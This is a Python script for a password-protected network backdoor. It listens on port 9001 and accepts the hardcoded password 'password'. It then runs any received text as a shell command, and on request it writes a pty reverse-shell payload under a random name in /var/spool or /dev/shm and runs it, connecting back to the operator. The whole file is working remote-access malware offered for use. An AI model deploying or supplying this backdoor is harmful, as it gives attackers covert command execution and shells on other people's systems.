#!/usr/bin/env python3

import socket
import subprocess
import threading
import string
import random


PYTHON_REVERSE = """
import sys
import socket
import os
import pty
s=socket.socket()
s.connect(("{}",{}))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")
"""

def findPythonVersion():
	pythonList = ['python', 'python2', 'python3']
	validPython = []
	for i in pythonList:
		output = subprocess.Popen("which {}".format(i), shell=True, stdout=subprocess.PIPE)
		if output.stdout.read() != b'':
			validPython.append(i)
	return pythonList

def amIRoot():
	output = subprocess.Popen("whoami", shell=True, stdout=subprocess.PIPE)
	return output.stdout.read() == b"root"

def writeReverseShell(ip, port):
	contents = PYTHON_REVERSE
	randomName = ''.join(random.choice(string.ascii_lowercase) for _ in range(10))
	if amIRoot():
		directoryName = "/var/spool/{}.py".format(randomName)
	else:
		directoryName = "/dev/shm/{}.py".format(randomName)
	with open(directoryName, "w") as f:
		f.write(contents.format(ip, port))
	return directoryName

LOCALHOST = '0.0.0.0'
PORT = 9001
banner = (b"""
================================================
        Password Protected Backdoor        
================================================

""")
class ClientThread(threading.Thread):
    def __init__(self,clientAddress,clientsocket):
        threading.Thread.__init__(self)
        self.csocket = clientsocket
        print ("New connection added: ", clientAddress)
    def run(self):
        print('Connected by', clientAddress)
        while True:
            self.csocket.send(banner)
            while True:
                data = self.csocket.recv(1024)
                if data.decode() == "password\n":
                    self.csocket.send(b"Correct Password!\n")
                    while True:
                        data = self.csocket.recv(1024)
                        self.csocket.send(b"Command: " + data)
                        command = data.decode()
                        if command == "reverseshell\n":
                        	self.csocket.send(b"Enter Port: ")
                        	data_2 = self.csocket.recv(1024)
                        	command_2 = data_2.decode()
                        	port = 0
                        	try:
                        		port = int(command_2)
                        	except:
                        		port = 9001 #default
                        	pythonVersions = findPythonVersion()
                        	if len(pythonVersions) > 0:
                        		fileName = writeReverseShell(clientAddress[0], port)
                        		cmd = "{} {}".format(pythonVersions[0], fileName)
                        		subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
                        		self.csocket.send(b"Done!\n")
                        		return
                        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
                        output = proc.stdout.read()
                        self.csocket.send(bytes(output))
                else:
                    self.csocket.send(b"Password Incorrect\n")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((LOCALHOST, PORT))
print("Server started")
print("Waiting for clients to connect...")

while True:
    s.listen(1000)
    clientsock, clientAddress = s.accept()
    newthread = ClientThread(clientAddress, clientsock)
    newthread.start()
